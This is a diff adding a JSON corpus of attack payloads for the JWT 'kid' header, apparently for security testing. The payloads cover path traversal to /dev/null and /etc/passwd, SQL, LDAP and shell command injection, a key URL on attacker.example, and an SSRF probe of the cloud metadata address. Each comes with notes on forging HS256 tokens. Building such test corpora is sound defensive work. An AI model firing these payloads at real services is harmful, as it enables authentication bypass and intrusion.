@@ -1,0 +1,163 @@
+[
+  {
+    "id": "kid_path_traversal_dev_null",
+    "category": "path_traversal",
+    "kid": "../../../../../../../dev/null",
+    "intent": "Point kid at /dev/null so the key file read is empty; many homegrown verifiers then HMAC-sign with an empty key. Forge with HS256 over secret ''.",
+    "expected_signing_key": "",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_path_traversal_etc_passwd",
+    "category": "path_traversal",
+    "kid": "../../../../../../../etc/passwd",
+    "intent": "Read a predictable-content system file as the HMAC key. If the SP loads /etc/passwd, its bytes become the signing key and are forgeable.",
+    "expected_signing_key": "<contents of /etc/passwd>",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_path_traversal_proc_environ",
+    "category": "path_traversal",
+    "kid": "../../../../../../../proc/self/environ",
+    "intent": "Use process environment as key material; leaks via error and is often predictable in containers.",
+    "expected_signing_key": "<contents of /proc/self/environ>",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_absolute_dev_null",
+    "category": "path_traversal",
+    "kid": "/dev/null",
+    "intent": "Absolute path to an empty file -> empty signing key -> forge HS256 over ''.",
+    "expected_signing_key": "",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_absolute_etc_hostname",
+    "category": "path_traversal",
+    "kid": "/etc/hostname",
+    "intent": "Short predictable file; container hostname is often known, making the HMAC key recoverable.",
+    "expected_signing_key": "<contents of /etc/hostname>",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_windows_traversal_nul",
+    "category": "path_traversal",
+    "kid": "..\\..\\..\\..\\..\\..\\Windows\\win.ini",
+    "intent": "Windows-style traversal for SPs running on IIS / .NET that resolve kid against the filesystem.",
+    "expected_signing_key": "<contents of win.ini>",
+    "cwe": "CWE-22"
+  },
+  {
+    "id": "kid_null_byte_traversal",
+    "category": "path_traversal",
+    "kid": "../../../../dev/null%00.pem",
+    "intent": "Null-byte truncation so a '.pem' suffix appended by the app is dropped and the path resolves to /dev/null.",
+    "expected_signing_key": "",
+    "cwe": "CWE-158"
+  },
+  {
+    "id": "kid_sqli_or_1eq1",
+    "category": "sql_injection",
+    "kid": "' OR '1'='1",
+    "intent": "kid used in a SQL key lookup. Boolean-true returns the first/any key row; attacker may then know or control it.",
+    "cwe": "CWE-89"
+  },
+  {
+    "id": "kid_sqli_union_select_static",
+    "category": "sql_injection",
+    "kid": "nonexistent' UNION SELECT 'attacker-controlled-key'-- -",
+    "intent": "Inject a known key value via UNION so the verifier signs/checks with a key the attacker chose.",
+    "expected_signing_key": "attacker-controlled-key",
+    "cwe": "CWE-89"
+  },
+  {
+    "id": "kid_sqli_union_null_padded",
+    "category": "sql_injection",
+    "kid": "x' UNION SELECT NULL,NULL,NULL-- -",
+    "intent": "Column-count probe / null key injection; an empty key result lets attacker forge with HS256 over ''.",
+    "expected_signing_key": "",
+    "cwe": "CWE-89"
+  },
+  {
+    "id": "kid_sqli_stacked_comment",
+    "category": "sql_injection",
+    "kid": "1'/**/OR/**/'1'='1",
+    "intent": "Comment-obfuscated boolean injection to bypass naive keyword filters on the kid value.",
+    "cwe": "CWE-89"
+  },
+  {
+    "id": "kid_command_injection_semicolon",
+    "category": "command_injection",
+    "kid": "key1; cat /dev/null #",
+    "intent": "If kid is shell-interpolated (e.g. openssl invocation), terminate the command and substitute predictable output.",
+    "cwe": "CWE-78"
+  },
+  {
+    "id": "kid_command_injection_backtick",
+    "category": "command_injection",
+    "kid": "`echo -n ''`",
+    "intent": "Backtick substitution to coerce an empty key when kid feeds a shell key-fetch routine.",
+    "expected_signing_key": "",
+    "cwe": "CWE-78"
+  },
+  {
+    "id": "kid_command_injection_subshell",
+    "category": "command_injection",
+    "kid": "$(printf '')",
+    "intent": "POSIX command substitution producing an empty signing key.",
+    "expected_signing_key": "",
+    "cwe": "CWE-78"
+  },
+  {
+    "id": "kid_ldap_injection_wildcard",
+    "category": "ldap_injection",
+    "kid": "*)(uid=*))(|(uid=*",
+    "intent": "kid used as an LDAP filter for key retrieval; wildcard returns the first directory key entry.",
+    "cwe": "CWE-90"
+  },
+  {
+    "id": "kid_ldap_injection_null_filter",
+    "category": "ldap_injection",
+    "kid": "*",
+    "intent": "Bare wildcard LDAP key lookup; matches any key entry, often the first/most-privileged.",
+    "cwe": "CWE-90"
+  },
+  {
+    "id": "kid_jku_url_pivot",
+    "category": "remote_key_url",
+    "kid": "https://attacker.example/jwks.json",
+    "intent": "Some implementations treat kid (or jku/x5u) as a URL and fetch the JWKS from it; serve an attacker key set.",
+    "cwe": "CWE-918"
+  },
+  {
+    "id": "kid_ssrf_internal_metadata",
+    "category": "remote_key_url",
+    "kid": "http://169.254.169.254/latest/meta-data/",
+    "intent": "If kid is fetched as a URL, point it at cloud metadata to confirm SSRF in the key-resolution path.",
+    "cwe": "CWE-918"
+  },
+  {
+    "id": "kid_empty_string",
+    "category": "type_confusion",
+    "kid": "",
+    "intent": "Empty kid; some lookups return a default/empty key, enabling HS256 forgery over ''.",
+    "expected_signing_key": "",
+    "cwe": "CWE-345"
+  },
+  {
+    "id": "kid_array_type_confusion",
+    "category": "type_confusion",
+    "kid": ["../../dev/null"],
+    "intent": "kid as a JSON array to break type-strict lookups and trigger str() coercion / first-element resolution.",
+    "expected_signing_key": "",
+    "cwe": "CWE-843"
+  },
+  {
+    "id": "kid_dot_self_reference",
+    "category": "path_traversal",
+    "kid": ".",
+    "intent": "Current-directory reference; on some loaders resolves to a directory read returning empty key bytes.",
+    "expected_signing_key": "",
+    "cwe": "CWE-22"
+  }
+]
